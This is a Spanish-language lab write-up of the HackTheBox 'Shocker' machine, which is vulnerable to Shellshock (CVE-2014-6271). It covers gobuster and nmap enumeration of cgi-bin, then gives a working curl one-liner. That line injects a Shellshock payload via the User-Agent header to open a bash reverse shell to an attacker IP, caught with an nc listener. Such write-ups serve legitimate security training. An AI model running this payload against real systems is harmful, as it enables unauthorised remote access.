#shellshock

-----
Esta vulnerabilidad tambien es conocida como Shellshock


# [[Gobuster]]

```shell
gobuster dir -u http://10.10.10.56 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt --add-slash -t 64
```

![[Shocker8.png]]

Nos da que existe un directorio http://10.10.10.56/cgi-bin/

Ahora aplicamos enumeracion en este directorio buscando archivos con extension  ``.sh .pl .cgi`` 

```shell
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x sh,pl,cgi -t 64
```

![[Shocker9.png]]

Y da que en el directorio *cgi-bin* hay un archivo *user.sh*   `http://10.10.10.56/cgi-bin/user.sh`

-------

# [[NMAP Scripts]]

Como estamos ante el directorio *cgi-bin*, ejecutamos un comando de enumaracion de shellshock de `nmap` poniendo el archivo de *user.sh* que encontramos antes:
```shell
nmap -p80 10.10.10.56 --script http-shellshock --script-args uri=/cgi-bin/user.sh
```

![[Shocker7.png]]
Nos indica que es vulnerable a [[CVE-2014-6271]]

---------
# Explotacion [[CVE-2014-6271]] y [[Reverse shell]]

[Articulo de shellshock](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html)
Vamos a usar [[curl]] con el comando `curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo;echo; /bin/bash -i >& /dev/tcp/10.10.16.6/443 0>&1"`
	aca no se usa el %26 para el & por que estamos dentro de bash y no se va a decodificar
	se pone el ;echo;echo para separar el payload malioso del comando

Ahora nos vamos a poner en escucha con [[nc -nlvp 443]]
![[Shocker8.png]]
Ya ganamos acceso a la maquina

----------

# Notas

## Extensiones .sh .pl. cgi
**.sh** El lenguaje es bash  
**.pl** Lenguaje Perl  
**.cgi** Common Gateway Interface Script

*¿Dónde se usan los archivos .cgi?*

- En servidores antiguos o simples que no usan PHP, Node.js, etc.
- En aplicaciones legacy que usan Perl o Bash.
- En entornos educativos o demostrativos.